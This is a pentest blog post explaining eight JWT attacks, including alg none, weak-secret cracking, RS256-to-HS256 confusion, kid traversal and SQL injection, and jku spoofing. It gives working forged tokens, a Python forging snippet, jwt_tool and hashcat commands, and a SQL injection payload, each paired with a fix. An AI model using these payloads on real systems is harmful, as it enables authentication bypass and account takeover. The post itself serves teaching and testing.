---
title: "JWT Attacks: From Token to Takeover"
date: 2026-05-31
categories: [Web Security, JWT]
tags: [jwt, authentication, pentest, portswigger, web-hacking, offensive-security]
image:
    path: /assets/images/JWTs/ALONE_warrior.gif
description: >
  JWTs are everywhere  and so are their misconfigurations. 
  This writeup covers every major JWT attack a pentester needs to know, 
  explained simply with real exploitation steps.
---

> **"JWTs are like passports  useful when secure, dangerous when forged."**

I've been going deep on JWT attacks lately while working through PortSwigger labs and reading some great writeups. Every time I test a web app, JWTs keep showing up  in Authorization headers, cookies, API calls. And every time, I ask myself: *is this thing actually safe?*

Spoiler: often it's not.

This post is my full breakdown of JWT vulnerabilities  what they are, how to exploit them, and how to test for them as a pentester. No fluff, just practical stuff you can use.

![JWTs are everywhere](/assets/images/JWTs/jwt_adminPanel.webp)

---

## What Even Is a JWT?

A JWT (JSON Web Token) has three parts separated by dots:

```
HEADER.PAYLOAD.SIGNATURE
```

**Example:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyIjoidXNlcjEiLCJhZG1pbiI6ZmFsc2V9.
X5cBA0klC0df_vxTqM-M1WOUbE8Qzj0Kh3w_N6Y7LkI
```

Each part is just Base64URL encoded. Paste any JWT into [jwt.io](https://jwt.io) and you can read it instantly  it's NOT encrypted. The signature is what makes it trustworthy (or not).

```
Header  → {"alg": "HS256", "typ": "JWT"}
Payload → {"user": "user1", "admin": false}
Signature → HMAC of header + payload using a secret key
```

The whole point: **server trusts the payload only if the signature is valid.**

If the server doesn't properly check that signature? Game over.

---

##  Attack 1: Signature Not Verified

### What's happening?

Some apps just... never verify the signature. They decode the JWT and trust the payload directly. This usually happens when a developer uses a library's `decode()` function instead of `verify()`.

### How to test

1. Grab your JWT (from cookie or `Authorization` header in Burp)
2. Paste it into [jwt.io](https://jwt.io)
3. Change the payload  e.g., set `"admin": true` or `"user": "admin"`
4. Send the modified token
5. If it works → **no signature verification**

### Impact

Full authentication/authorization bypass. You can become any user, including admin.

### Fix

Always use `verify()` not `decode()`. Add tests that send tampered tokens and confirm the server rejects them.

---

##  Attack 2: None Algorithm Attack

### What's happening?

The JWT spec technically allows `"alg": "none"`  meaning no signature at all. Early library versions accepted this blindly. Some still do.

### Step by step

1. Get a valid JWT
2. Decode the header, change `"alg"` to `"none"` (or `"None"`, `"NONE"`  try all variants)
3. Modify the payload (e.g., `"role": "admin"`)
4. Re-encode header and payload
5. Assemble as: `base64url(header).base64url(payload).` ← note the trailing dot with empty signature
6. Send it

### Real example

```
# Original header
{"alg": "HS256", "typ": "JWT"}

# Modified header
{"alg": "none", "typ": "JWT"}

# Final token (empty signature after last dot)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

### Fix

Explicitly reject `"none"` algorithm. Use an algorithm allowlist in your JWT library config.

---

##  Attack 3: Weak Secret (Brute Force HS256)

### What's happening?

When the algorithm is `HS256`, the token is signed with a shared secret. If that secret is weak (like `"secret"`, `"123456"`, or the app name), you can crack it offline with `hashcat`.

### How to crack

```bash
# Using hashcat
hashcat -a 0 -m 16500 <your_jwt> /usr/share/wordlists/rockyou.txt

# Using jwt_tool
python3 jwt_tool.py <jwt> -C -d /usr/share/wordlists/rockyou.txt
```

Once you have the secret, you can sign any token you want.

### What to try as a wordlist

- `rockyou.txt`
- [wallarm/jwt-secrets](https://github.com/wallarm/jwt-secrets)  a dedicated JWT secrets wordlist
- App name, domain name, service name

### Fix

Use a cryptographically random secret, at least 32 bytes. Never hardcode it. Rotate it periodically.

---

##  Attack 4: Algorithm Confusion (RS256 → HS256)

This one is my favourite. It's subtle and devastating.

### The idea

- `RS256` = asymmetric. Server signs with **private key**, verifies with **public key**.
- `HS256` = symmetric. Same secret used to sign AND verify.

If the server reads `alg` from the JWT header and doesn't enforce the algorithm server-side, you can switch it from `RS256` to `HS256`. Now the server will try to verify using HS256  and it'll use its RSA **public key** as the HMAC secret.

Since you can get the public key (it's public!), you can sign tokens with it and the server will accept them.

### Step by step

1. Get a valid RS256 JWT
2. Get the server's RSA public key (check `/jwks.json`, source code, docs, mobile app)
3. Modify the header: `"alg": "RS256"` → `"alg": "HS256"`
4. Modify the payload (e.g., become admin)
5. Sign the new `header.payload` using HMAC-SHA256 with the public key as the secret
6. Send it

```python
import jwt
import base64

public_key = open("public_key.pem").read()

payload = {"user": "admin", "role": "admin"}
token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
```

### Fix

Never trust the `alg` field from the token. Enforce the expected algorithm in server config.

---

##  Attack 5: kid Injection

### What's happening?

The `kid` (Key ID) field in the JWT header tells the server which key to use for verification. If the app fetches the key from a file path or database using `kid` directly  it's injectable.

### Path Traversal via kid

```json
{"alg": "HS256", "kid": "../../../../dev/null"}
```

Reading `/dev/null` returns an empty string. So you sign your token with an empty string secret  and it verifies.

```bash
# Sign with empty secret using jwt_tool
python3 jwt_tool.py <jwt> -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""
```

### SQL Injection via kid

If the app does something like:
```sql
SELECT key FROM keys WHERE kid = '<value>'
```

You can inject:
```
' UNION SELECT 'mysecret' --
```

Now the app uses `mysecret` as the key  and you sign your token with that.

### Fix

Never use `kid` directly in file paths or SQL queries. Use an allowlist of valid key IDs with hardcoded mappings.

---

##  Attack 6: Embedded JWK (CVE-2018-0114)

### What's happening?

JWTs can include a `jwk` field in the header  your own public key. Vulnerable servers will use **whatever key is in the token** to verify it, instead of their own trusted key.

So you generate your own RSA key pair, embed your public key in the token, sign it with your private key, and the server accepts it.

### Step by step

1. Generate RSA key pair
2. Create a JWT with forged payload
3. Add your public key in the header as `jwk`
4. Sign the token with your private key
5. Send it

```bash
# jwt_tool can do this for you
python3 jwt_tool.py <jwt> -X i
```

### Fix

Never use keys from the token itself. Validate that any `jwk` comes from a trusted, pre-configured source.

---

##  Attack 7: JKU / X5U Header Abuse

### What's happening?

`jku` (JWK Set URL) tells the server where to fetch the public key from. If there's no allowlist, you can point it at your own server hosting your own key.

### Step by step

1. Generate RSA key pair
2. Host your public key at `https://your-server.com/jwks.json`
3. Modify the JWT header: `"jku": "https://your-server.com/jwks.json"`
4. Sign with your private key
5. Send the token

The server fetches YOUR key and uses it to verify the token  which of course passes.

**Bonus:** This also works via file upload (upload a JWKS file to the target itself), open redirects, or header injection.

```bash
# jwt_tool
python3 jwt_tool.py <jwt> -X s -ju "https://your-server.com/jwks.json"
```

### Fix

Strict allowlist for `jku`/`x5u` URLs. Only accept keys from pre-approved domains.

---

##  Attack 8: Psychic Signature (CVE-2022-21449)

### What's happening?

This was a wild bug in Java's ECDSA verification. If you sent a JWT with both `r=0` and `s=0` in the signature, Java would accept it as valid. Completely bypassing cryptographic verification.

### Affected systems

Any Java app using `ES256` on JDK versions before: 17.0.3, 11.0.15, 8u331.

### The forged signature

The Base64URL-encoded zero-signature is: `MAYCAQACAQA`

```
eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.<your_payload>.MAYCAQACAQA
```

Just slap that at the end of any header+payload and Java will say "yep, valid."

### Fix

Upgrade Java. That's it. The patch validates that `r` and `s` are non-zero.

---

##  Tools You Need

| Tool | Use |
|------|-----|
| [jwt.io](https://jwt.io) | Decode and inspect JWTs |
| [jwt_tool](https://github.com/ticarpi/jwt_tool) | Automated JWT attack suite |
| Burp Suite | Intercept and modify requests |
| Hashcat | Crack weak HS256 secrets |
| [CyberChef](https://gchq.github.io/CyberChef/) | Base64URL encode/decode |

### Quick jwt_tool cheatsheet

```bash
# Install
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r requirements.txt

# Decode a token
python3 jwt_tool.py <token>

# Run all attacks
python3 jwt_tool.py <token> -M at

# Brute force secret
python3 jwt_tool.py <token> -C -d wordlist.txt

# None algorithm
python3 jwt_tool.py <token> -X a

# Embedded JWK
python3 jwt_tool.py <token> -X i

# JKU spoof
python3 jwt_tool.py <token> -X s -ju "https://your-server.com/jwks.json"
```

---

##  JWT Security Best Practices (For Devs)

I know this is a pentest blog but when I find these in bug bounties, here's what I tell devs to fix:

|  Don't |  Do |
|----------|-------|
| Trust the `alg` field from the token | Enforce algorithm server-side |
| Use `decode()` without verifying | Always use `verify()` |
| Use weak secrets like `"secret"` | Use 32+ random bytes |
| Accept `"alg": "none"` | Explicitly block `none` |
| Use `kid` directly in SQL/file paths | Validate and allowlist `kid` values |
| Accept keys from `jwk` header | Only trust pre-configured keys |
| Fetch keys from any `jku` URL | Allowlist trusted domains only |
| Use outdated JWT libraries | Keep dependencies updated |

---

## Where to Practice

- [PortSwigger JWT Labs](https://portswigger.net/web-security/jwt)  the best free hands-on practice
- [PentesterLab JWT exercises](https://pentesterlab.com)  covers every attack in this post
- HackTheBox / TryHackMe web challenges

---

## Final Thoughts

JWTs look simple but they have a huge attack surface. The worst part? Every endpoint in an app might handle JWT differently  different libraries, different configs, different bugs.

As a pentester: **test every endpoint individually.** Don't assume one secure endpoint means the whole app is safe.

The attacks in this post aren't theoretical  they come from real CVEs and real bug bounty findings. If you haven't been testing JWTs deeply in your web app assessments, start now.

Happy hacking. Stay ethical. 🖤

---

*— Rabin Gaire | [myselfrabin.github.io](https://myselfrabin.github.io)*

*Tags: JWT, Web Security, Pentest, Authentication, PortSwigger, Offensive Security*